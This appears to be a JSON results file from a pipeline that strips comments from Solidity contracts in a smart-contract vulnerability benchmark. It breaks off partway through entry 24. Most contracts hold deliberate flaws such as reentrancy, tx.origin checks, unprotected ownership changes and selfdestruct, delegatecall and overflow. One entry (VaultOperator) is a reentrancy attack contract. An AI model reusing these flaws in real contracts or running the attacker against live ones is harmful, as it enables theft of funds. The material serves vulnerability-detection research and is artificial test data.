{
  "timestamp": "2025-12-17T13:25:31.113000",
  "level": "l1",
  "variant": "compressed",
  "source": "sanitized",
  "total_files": 252,
  "successful": 251,
  "failed": 1,
  "results": [
    {
      "original_id": "sn_ds_001",
      "transformed_id": "ss_l1_compressed_sn_ds_001",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "contract theRun {\nuint private Balance = 0;\nuint private Payout_id = 0;\nuint private Last_Payout = 0;\nuint private WinningPot = 0;\nuint private Min_multiplier = 1100;\nuint private fees = 0;\nuint private feeFrac = 20;\nuint private PotFrac = 30;\naddress private admin;\nfunction theRun() {\nadmin = msg.sender;\n}\nmodifier onlyowner {if (msg.sender == admin) _; }\nstruct Player {\naddress addr;\nuint payout;\nbool paid;\n}\nPlayer[] private players;\nfunction() {\ninit();\n}\nfunction init() private {\nuint deposit=msg.value;\nif (msg.value < 500 finney) {\nmsg.sender.send(msg.value);\nreturn;\n}\nif (msg.value > 20 ether) {\nmsg.sender.send(msg.value- (20 ether));\ndeposit=20 ether;\n}\nParticipate(deposit);\n}\nfunction Participate(uint deposit) private {\nuint total_multiplier=Min_multiplier;\nif(Balance < 1 ether && players.length>1){\ntotal_multiplier+=100;\n}\nif( (players.length % 10)==0 && players.length>1 ){\ntotal_multiplier+=100;\n}\nplayers.push(Player(msg.sender, (deposit * total_multiplier) / 1000, false));\nWinningPot += (deposit * PotFrac) / 1000;\nfees += (deposit * feeFrac) / 1000;\nBalance += (deposit * (1000 - ( feeFrac + PotFrac ))) / 1000;\nif( ( deposit > 1 ether ) && (deposit > players[Payout_id].payout) ){\nuint roll = random(100);\nif( roll % 10 == 0 ){\nmsg.sender.send(WinningPot);\nWinningPot=0;\n}\n}\nwhile ( Balance > players[Payout_id].payout ) {\nLast_Payout = players[Payout_id].payout;\nplayers[Payout_id].addr.send(Last_Payout);\nBalance -= players[Payout_id].payout;\nplayers[Payout_id].paid=true;\nPayout_id += 1;\n}\n}\nuint256 constant private salt = block.timestamp;\nfunction random(uint Max) constant private returns (uint256 result){\nuint256 x = salt * 100 / Max;\nuint256 y = salt * block.number / (salt % 5) ;\nuint256 seed = block.number/3 + (salt % 300) + Last_Payout +y;\nuint256 h = uint256(block.blockhash(seed));\nreturn uint256((h / x)) % Max + 1;\n}\nfunction ChangeOwnership(address _owner) onlyowner {\nadmin = _owner;\n}\nfunction WatchBalance() constant returns(uint TotalBalance) {\nTotalBalance = Balance / 1 wei;\n}\nfunction WatchBalanceInEther() constant returns(uint TotalBalanceInEther) {\nTotalBalanceInEther = Balance / 1 ether;\n}\nfunction CollectAllFees() onlyowner {\nif (fees == 0) throw;\nadmin.send(fees);\nfeeFrac-=1;\nfees = 0;\n}\nfunction GetAndReduceFeesByFraction(uint p) onlyowner {\nif (fees == 0) feeFrac-=1;\nadmin.send(fees / 1000 * p);\nfees -= fees / 1000 * p;\n}\nfunction NextPayout() constant returns(uint NextPayout) {\nNextPayout = players[Payout_id].payout / 1 wei;\n}\nfunction WatchFees() constant returns(uint CollectedFees) {\nCollectedFees = fees / 1 wei;\n}\nfunction WatchWinningPot() constant returns(uint WinningPot) {\nWinningPot = WinningPot / 1 wei;\n}\nfunction WatchLastPayout() constant returns(uint payout) {\npayout = Last_Payout;\n}\nfunction Total_of_Players() constant returns(uint NumberOfPlayers) {\nNumberOfPlayers = players.length;\n}\nfunction PlayerInfo(uint id) constant returns(address Address, uint Payout, bool UserPaid) {\nif (id <= players.length) {\nAddress = players[id].addr;\nPayout = players[id].payout / 1 wei;\nUserPaid=players[id].paid;\n}\n}\nfunction PayoutQueueSize() constant returns(uint QueueSize) {\nQueueSize = players.length - Payout_id;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 33,
        "mode": "compressed",
        "original_lines": 162,
        "transformed_lines": 116,
        "original_chars": 5738,
        "transformed_chars": 3198,
        "compression_ratio": 0.56
      },
      "error": null
    },
    {
      "original_id": "sn_ds_002",
      "transformed_id": "ss_l1_compressed_sn_ds_002",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract TokenVault {\nmapping (address => uint) userBalance;\nfunction getBalance(address u) constant returns(uint){\nreturn userBalance[u];\n}\nfunction addToBalance() payable{\nuserBalance[msg.sender] += msg.value;\n}\nfunction withdrawBalance(){\nif( ! (msg.sender.call.value(userBalance[msg.sender])() ) ){\nthrow;\n}\nuserBalance[msg.sender] = 0;\n}\nfunction withdrawBalanceV2(){\nuint amount = userBalance[msg.sender];\nuserBalance[msg.sender] = 0;\nif( ! (msg.sender.call.value(amount)() ) ){\nthrow;\n}\n}\nfunction withdrawBalanceV3(){\nmsg.sender.transfer(userBalance[msg.sender]);\nuserBalance[msg.sender] = 0;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 11,
        "mode": "compressed",
        "original_lines": 43,
        "transformed_lines": 27,
        "original_chars": 1188,
        "transformed_chars": 629,
        "compression_ratio": 0.53
      },
      "error": null
    },
    {
      "original_id": "sn_ds_003",
      "transformed_id": "ss_l1_compressed_sn_ds_003",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract VaultOperator {\nbool public operationActive=false;\naddress public target_contract;\naddress public owner;\nfunction VaultOperator() public{\nowner = msg.sender;\n}\nfunction deposit(address _target_contract) public payable{\ntarget_contract = _target_contract ;\nrequire(target_contract.call.value(msg.value)(bytes4(sha3(\"addToBalance()\"))));\n}\nfunction launch_handler() public{\noperationActive = true;\nrequire(target_contract.call(bytes4(sha3(\"withdrawBalance()\"))));\n}\nfunction () public payable{\nif (operationActive){\noperationActive = false;\nrequire(target_contract.call(bytes4(sha3(\"withdrawBalance()\"))));\n}\n}\nfunction get_money(){\nsuicide(owner);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 11,
        "mode": "compressed",
        "original_lines": 38,
        "transformed_lines": 26,
        "original_chars": 952,
        "transformed_chars": 684,
        "compression_ratio": 0.72
      },
      "error": null
    },
    {
      "original_id": "sn_ds_004",
      "transformed_id": "ss_l1_compressed_sn_ds_004",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract Ledger {\nuint private sellerBalance=0;\nfunction add(uint value) returns (bool){\nsellerBalance += value;\n}\nfunction safe_add(uint value) returns (bool){\nrequire(value + sellerBalance >= sellerBalance);\nsellerBalance += value;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 18,
        "transformed_lines": 11,
        "original_chars": 420,
        "transformed_chars": 262,
        "compression_ratio": 0.62
      },
      "error": null
    },
    {
      "original_id": "sn_ds_005",
      "transformed_id": "ss_l1_compressed_sn_ds_005",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract OpenAccess{\naddress private owner;\nmodifier onlyowner {\nrequire(msg.sender==owner);\n_;\n}\nfunction OpenAccess()\npublic {\nowner = msg.sender;\n}\nfunction changeOwner(address _newOwner)\npublic {\nowner = _newOwner;\n}\nfunction changeOwnerV2(address _newOwner)\npublic\nonlyowner {\nowner = _newOwner;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 31,
        "transformed_lines": 21,
        "original_chars": 525,
        "transformed_chars": 329,
        "compression_ratio": 0.63
      },
      "error": null
    },
    {
      "original_id": "sn_ds_006",
      "transformed_id": "ss_l1_compressed_sn_ds_006",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.15;\ncontract Alice {\nint public val;\nfunction set(int new_val){\nval = new_val;\n}\nfunction setV2(int new_val){\nval = new_val;\n}\nfunction(){\nval = 1;\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 18,
        "transformed_lines": 13,
        "original_chars": 260,
        "transformed_chars": 172,
        "compression_ratio": 0.66
      },
      "error": null
    },
    {
      "original_id": "sn_ds_007",
      "transformed_id": "ss_l1_compressed_sn_ds_007",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.22;\ncontract FibonacciBalance {\naddress public fibonacciLibrary;\nuint public calculatedFibNumber;\nuint public start = 3;\nuint public withdrawalCounter;\nbytes4 constant fibSig = bytes4(sha3(\"setFibonacci(uint256)\"));\nconstructor(address _fibonacciLibrary) public payable {\nfibonacciLibrary = _fibonacciLibrary;\n}\nfunction withdraw() {\nwithdrawalCounter += 1;\nrequire(fibonacciLibrary.delegatecall(fibSig, withdrawalCounter));\nmsg.sender.transfer(calculatedFibNumber * 1 ether);\n}\nfunction() public {\nrequire(fibonacciLibrary.delegatecall(msg.data));\n}\n}\ncontract FibonacciLib {\nuint public start;\nuint public calculatedFibNumber;\nfunction setStart(uint _start) public {\nstart = _start;\n}\nfunction setFibonacci(uint n) public {\ncalculatedFibNumber = fibonacci(n);\n}\nfunction fibonacci(uint n) internal returns (uint) {\nif (n == 0) return start;\nelse if (n == 1) return start + 1;\nelse return fibonacci(n - 1) + fibonacci(n - 2);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 15,
        "mode": "compressed",
        "original_lines": 54,
        "transformed_lines": 34,
        "original_chars": 1630,
        "transformed_chars": 951,
        "compression_ratio": 0.58
      },
      "error": null
    },
    {
      "original_id": "sn_ds_008",
      "transformed_id": "ss_l1_compressed_sn_ds_008",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.25;\ncontract Wallet {\nuint[] private bonusCodes;\naddress private owner;\nconstructor() public {\nbonusCodes = new uint[](0);\nowner = msg.sender;\n}\nfunction () public payable {\n}\nfunction PushBonusCode(uint c) public {\nbonusCodes.push(c);\n}\nfunction PopBonusCode() public {\nrequire(0 <= bonusCodes.length);\nbonusCodes.length--;\n}\nfunction UpdateBonusCodeAt(uint idx, uint c) public {\nrequire(idx < bonusCodes.length);\nbonusCodes[idx] = c;\n}\nfunction Destroy() public {\nrequire(msg.sender == owner);\nselfdestruct(msg.sender);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 8,
        "mode": "compressed",
        "original_lines": 34,
        "transformed_lines": 26,
        "original_chars": 854,
        "transformed_chars": 546,
        "compression_ratio": 0.64
      },
      "error": null
    },
    {
      "original_id": "sn_ds_009",
      "transformed_id": "ss_l1_compressed_sn_ds_009",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract Map {\naddress public owner;\nuint256[] map;\nfunction set(uint256 key, uint256 value) public {\nif (map.length <= key) {\nmap.length = key + 1;\n}\nmap[key] = value;\n}\nfunction get(uint256 key) public view returns (uint256) {\nreturn map[key];\n}\nfunction withdraw() public{\nrequire(msg.sender == owner);\nmsg.sender.transfer(address(this).balance);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 4,
        "mode": "compressed",
        "original_lines": 22,
        "transformed_lines": 18,
        "original_chars": 518,
        "transformed_chars": 378,
        "compression_ratio": 0.73
      },
      "error": null
    },
    {
      "original_id": "sn_ds_010",
      "transformed_id": "ss_l1_compressed_sn_ds_010",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract MyContract {\naddress owner;\nfunction MyContract() public {\nowner = msg.sender;\n}\nfunction sendTo(address receiver, uint amount) public {\nrequire(tx.origin == owner);\nreceiver.transfer(amount);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 17,
        "transformed_lines": 11,
        "original_chars": 311,
        "transformed_chars": 230,
        "compression_ratio": 0.74
      },
      "error": null
    },
    {
      "original_id": "sn_ds_011",
      "transformed_id": "ss_l1_compressed_sn_ds_011",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.22;\ncontract Phishable {\naddress public owner;\nconstructor (address _owner) {\nowner = _owner;\n}\nfunction () public payable {}\nfunction withdrawAll(address _recipient) public {\nrequire(tx.origin == owner);\n_recipient.transfer(this.balance);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 5,
        "mode": "compressed",
        "original_lines": 17,
        "transformed_lines": 12,
        "original_chars": 366,
        "transformed_chars": 264,
        "compression_ratio": 0.72
      },
      "error": null
    },
    {
      "original_id": "sn_ds_012",
      "transformed_id": "ss_l1_compressed_sn_ds_012",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract Proxy {\naddress owner;\nconstructor() public {\nowner = msg.sender;\n}\nfunction forward(address callee, bytes _data) public {\nrequire(callee.delegatecall(_data));\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 6,
        "mode": "compressed",
        "original_lines": 16,
        "transformed_lines": 10,
        "original_chars": 252,
        "transformed_chars": 197,
        "compression_ratio": 0.78
      },
      "error": null
    },
    {
      "original_id": "sn_ds_013",
      "transformed_id": "ss_l1_compressed_sn_ds_013",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.0;\ncontract SimpleDestruct {\nfunction sudicideAnyone() {\nselfdestruct(msg.sender);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 3,
        "mode": "compressed",
        "original_lines": 9,
        "transformed_lines": 6,
        "original_chars": 118,
        "transformed_chars": 107,
        "compression_ratio": 0.91
      },
      "error": null
    },
    {
      "original_id": "sn_ds_014",
      "transformed_id": "ss_l1_compressed_sn_ds_014",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract Wallet {\naddress creator;\nmapping(address => uint256) balances;\nconstructor() public {\ncreator = msg.sender;\n}\nfunction deposit() public payable {\nassert(balances[msg.sender] + msg.value > balances[msg.sender]);\nbalances[msg.sender] += msg.value;\n}\nfunction withdraw(uint256 amount) public {\nrequire(amount <= balances[msg.sender]);\nmsg.sender.transfer(amount);\nbalances[msg.sender] -= amount;\n}\nfunction refund() public {\nmsg.sender.transfer(balances[msg.sender]);\n}\nfunction migrateTo(address to) public {\nrequire(creator == msg.sender);\nto.transfer(this.balance);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 10,
        "mode": "compressed",
        "original_lines": 36,
        "transformed_lines": 24,
        "original_chars": 869,
        "transformed_chars": 604,
        "compression_ratio": 0.7
      },
      "error": null
    },
    {
      "original_id": "sn_ds_015",
      "transformed_id": "ss_l1_compressed_sn_ds_015",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract Wallet {\naddress creator;\nmapping(address => uint256) balances;\nfunction initWallet() public {\ncreator = msg.sender;\n}\nfunction deposit() public payable {\nassert(balances[msg.sender] + msg.value > balances[msg.sender]);\nbalances[msg.sender] += msg.value;\n}\nfunction withdraw(uint256 amount) public {\nrequire(amount <= balances[msg.sender]);\nmsg.sender.transfer(amount);\nbalances[msg.sender] -= amount;\n}\nfunction migrateTo(address to) public {\nrequire(creator == msg.sender);\nto.transfer(this.balance);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 9,
        "mode": "compressed",
        "original_lines": 32,
        "transformed_lines": 21,
        "original_chars": 785,
        "transformed_chars": 540,
        "compression_ratio": 0.69
      },
      "error": null
    },
    {
      "original_id": "sn_ds_016",
      "transformed_id": "ss_l1_compressed_sn_ds_016",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.24;\ncontract Wallet {\naddress creator;\nmapping(address => uint256) balances;\nconstructor() public {\ncreator = msg.sender;\n}\nfunction deposit() public payable {\nassert(balances[msg.sender] + msg.value > balances[msg.sender]);\nbalances[msg.sender] += msg.value;\n}\nfunction withdraw(uint256 amount) public {\nrequire(amount >= balances[msg.sender]);\nmsg.sender.transfer(amount);\nbalances[msg.sender] -= amount;\n}\nfunction migrateTo(address to) public {\nrequire(creator == msg.sender);\nto.transfer(this.balance);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 9,
        "mode": "compressed",
        "original_lines": 32,
        "transformed_lines": 21,
        "original_chars": 777,
        "transformed_chars": 532,
        "compression_ratio": 0.68
      },
      "error": null
    },
    {
      "original_id": "sn_ds_017",
      "transformed_id": "ss_l1_compressed_sn_ds_017",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract PERSONAL_BANK {\nmapping (address=>uint256) public balances;\nuint public MinSum = 1 ether;\nLogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);\nbool intitalized;\nfunction SetMinSum(uint _val)\npublic {\nif(intitalized)revert();\nMinSum = _val;\n}\nfunction SetLogFile(address _log)\npublic {\nif(intitalized)revert();\nLog = LogFile(_log);\n}\nfunction Initialized()\npublic {\nintitalized = true;\n}\nfunction Deposit()\npublic\npayable {\nbalances[msg.sender]+= msg.value;\nLog.AddMessage(msg.sender,msg.value,\"Put\");\n}\nfunction Collect(uint _am)\npublic\npayable {\nif(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) {\nif(msg.sender.call.value(_am)()) {\nbalances[msg.sender]-=_am;\nLog.AddMessage(msg.sender,_am,\"Collect\");\n}\n}\n}\nfunction()\npublic\npayable {\nDeposit();\n}\n}\ncontract LogFile {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 16,
        "mode": "compressed",
        "original_lines": 88,
        "transformed_lines": 60,
        "original_chars": 1557,
        "transformed_chars": 1120,
        "compression_ratio": 0.72
      },
      "error": null
    },
    {
      "original_id": "sn_ds_018",
      "transformed_id": "ss_l1_compressed_sn_ds_018",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract PrivateBank {\nmapping (address => uint) public balances;\nuint public MinDeposit = 1 ether;\nLog TransferLog;\nfunction PrivateBank(address _log) {\nTransferLog = Log(_log);\n}\nfunction Deposit()\npublic\npayable {\nif(msg.value >= MinDeposit) {\nbalances[msg.sender]+=msg.value;\nTransferLog.AddMessage(msg.sender,msg.value,\"Deposit\");\n}\n}\nfunction CashOut(uint _am) {\nif(_am<=balances[msg.sender]) {\nif(msg.sender.call.value(_am)()) {\nbalances[msg.sender]-=_am;\nTransferLog.AddMessage(msg.sender,_am,\"CashOut\");\n}\n}\n}\nfunction() public payable{}\n}\ncontract Log {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 14,
        "mode": "compressed",
        "original_lines": 68,
        "transformed_lines": 44,
        "original_chars": 1241,
        "transformed_chars": 878,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_019",
      "transformed_id": "ss_l1_compressed_sn_ds_019",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract ACCURAL_DEPOSIT {\nmapping (address=>uint256) public balances;\nuint public MinSum = 1 ether;\nLogFile Log = LogFile(0x0486cF65A2F2F3A392CBEa398AFB7F5f0B72FF46);\nbool intitalized;\nfunction SetMinSum(uint _val)\npublic {\nif(intitalized)revert();\nMinSum = _val;\n}\nfunction SetLogFile(address _log)\npublic {\nif(intitalized)revert();\nLog = LogFile(_log);\n}\nfunction Initialized()\npublic {\nintitalized = true;\n}\nfunction Deposit()\npublic\npayable {\nbalances[msg.sender]+= msg.value;\nLog.AddMessage(msg.sender,msg.value,\"Put\");\n}\nfunction Collect(uint _am)\npublic\npayable {\nif(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) {\nif(msg.sender.call.value(_am)()) {\nbalances[msg.sender]-=_am;\nLog.AddMessage(msg.sender,_am,\"Collect\");\n}\n}\n}\nfunction()\npublic\npayable {\nDeposit();\n}\n}\ncontract LogFile {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 16,
        "mode": "compressed",
        "original_lines": 88,
        "transformed_lines": 60,
        "original_chars": 1528,
        "transformed_chars": 1122,
        "compression_ratio": 0.73
      },
      "error": null
    },
    {
      "original_id": "sn_ds_020",
      "transformed_id": "ss_l1_compressed_sn_ds_020",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract PRIVATE_ETH_CELL {\nmapping (address=>uint256) public balances;\nuint public MinSum;\nLogFile Log;\nbool intitalized;\nfunction SetMinSum(uint _val)\npublic {\nrequire(!intitalized);\nMinSum = _val;\n}\nfunction SetLogFile(address _log)\npublic {\nrequire(!intitalized);\nLog = LogFile(_log);\n}\nfunction Initialized()\npublic {\nintitalized = true;\n}\nfunction Deposit()\npublic\npayable {\nbalances[msg.sender]+= msg.value;\nLog.AddMessage(msg.sender,msg.value,\"Put\");\n}\nfunction Collect(uint _am)\npublic\npayable {\nif(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) {\nif(msg.sender.call.value(_am)()) {\nbalances[msg.sender]-=_am;\nLog.AddMessage(msg.sender,_am,\"Collect\");\n}\n}\n}\nfunction()\npublic\npayable {\nDeposit();\n}\n}\ncontract LogFile {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 16,
        "mode": "compressed",
        "original_lines": 88,
        "transformed_lines": 60,
        "original_chars": 1492,
        "transformed_chars": 1055,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_021",
      "transformed_id": "ss_l1_compressed_sn_ds_021",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract BANK_SAFE {\nmapping (address=>uint256) public balances;\nuint public MinSum;\nLogFile Log;\nbool intitalized;\nfunction SetMinSum(uint _val)\npublic {\nif(intitalized)throw;\nMinSum = _val;\n}\nfunction SetLogFile(address _log)\npublic {\nif(intitalized)throw;\nLog = LogFile(_log);\n}\nfunction Initialized()\npublic {\nintitalized = true;\n}\nfunction Deposit()\npublic\npayable {\nbalances[msg.sender]+= msg.value;\nLog.AddMessage(msg.sender,msg.value,\"Put\");\n}\nfunction Collect(uint _am)\npublic\npayable {\nif(balances[msg.sender]>=MinSum && balances[msg.sender]>=_am) {\nif(msg.sender.call.value(_am)()) {\nbalances[msg.sender]-=_am;\nLog.AddMessage(msg.sender,_am,\"Collect\");\n}\n}\n}\nfunction()\npublic\npayable {\nDeposit();\n}\n}\ncontract LogFile {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 16,
        "mode": "compressed",
        "original_lines": 88,
        "transformed_lines": 60,
        "original_chars": 1483,
        "transformed_chars": 1046,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_022",
      "transformed_id": "ss_l1_compressed_sn_ds_022",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.19;\ncontract Ownable {\naddress newOwner;\naddress owner = msg.sender;\nfunction changeOwner(address addr)\npublic\nonlyOwner {\nnewOwner = addr;\n}\nfunction confirmOwner()\npublic {\nif(msg.sender==newOwner) {\nowner=newOwner;\n}\n}\nmodifier onlyOwner {\nif(owner == msg.sender)_;\n}\n}\ncontract Token is Ownable {\naddress owner = msg.sender;\nfunction WithdrawToken(address token, uint256 amount,address to)\npublic\nonlyOwner {\ntoken.call(bytes4(sha3(\"transfer(address,uint256)\")),to,amount);\n}\n}\ncontract TokenBank is Token {\nuint public MinDeposit;\nmapping (address => uint) public Holders;\nfunction initTokenBank()\npublic {\nowner = msg.sender;\nMinDeposit = 1 ether;\n}\nfunction()\npayable {\nDeposit();\n}\nfunction Deposit()\npayable {\nif(msg.value>MinDeposit) {\nHolders[msg.sender]+=msg.value;\n}\n}\nfunction WitdrawTokenToHolder(address _to,address _token,uint _amount)\npublic\nonlyOwner {\nif(Holders[_to]>0) {\nHolders[_to]=0;\nWithdrawToken(_token,_amount,_to);\n}\n}\nfunction WithdrawToHolder(address _addr, uint _wei)\npublic\nonlyOwner\npayable {\nif(Holders[_addr]>0) {\nif(_addr.call.value(_wei)()) {\nHolders[_addr]-=_wei;\n}\n}\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 12,
        "mode": "compressed",
        "original_lines": 94,
        "transformed_lines": 64,
        "original_chars": 1618,
        "transformed_chars": 1131,
        "compression_ratio": 0.7
      },
      "error": null
    },
    {
      "original_id": "sn_ds_023",
      "transformed_id": "ss_l1_compressed_sn_ds_023",
      "level": "l1",
      "variant": "compressed",
      "source": "sanitized",
      "success": true,
      "code": "pragma solidity ^0.4.25;\ncontract U_BANK {\nfunction Put(uint _unlockTime)\npublic\npayable {\nvar acc = Acc[msg.sender];\nacc.balance += msg.value;\nacc.unlockTime = _unlockTime>now?_unlockTime:now;\nLogFile.AddMessage(msg.sender,msg.value,\"Put\");\n}\nfunction Collect(uint _am)\npublic\npayable {\nvar acc = Acc[msg.sender];\nif( acc.balance>=MinSum && acc.balance>=_am && now>acc.unlockTime) {\nif(msg.sender.call.value(_am)()) {\nacc.balance-=_am;\nLogFile.AddMessage(msg.sender,_am,\"Collect\");\n}\n}\n}\nfunction()\npublic\npayable {\nPut(0);\n}\nstruct Holder {\nuint unlockTime;\nuint balance;\n}\nmapping (address => Holder) public Acc;\nLog LogFile;\nuint public MinSum = 2 ether;\nfunction U_BANK(address log) public{\nLogFile = Log(log);\n}\n}\ncontract Log {\nstruct Message {\naddress Sender;\nstring Data;\nuint Val;\nuint Time;\n}\nMessage[] public History;\nMessage LastMsg;\nfunction AddMessage(address _adr,uint _val,string _data)\npublic {\nLastMsg.Sender = _adr;\nLastMsg.Time = now;\nLastMsg.Val = _val;\nLastMsg.Data = _data;\nHistory.push(LastMsg);\n}\n}",
      "rename_map": {},
      "changes": [
        "Applied compressed formatting"
      ],
      "stats": {
        "comments_removed": true,
        "blank_lines_removed": 13,
        "mode": "compressed",
        "original_lines": 78,
        "transformed_lines": 55,
        "original_chars": 1434,
        "transformed_chars": 1024,
        "compression_ratio": 0.71
      },
      "error": null
    },
    {
      "original_id": "sn_ds_024",
      "transformed_id": "ss_l1_compressed_sn_ds_024",
      "level": "l1",
      "variant": "compressed",
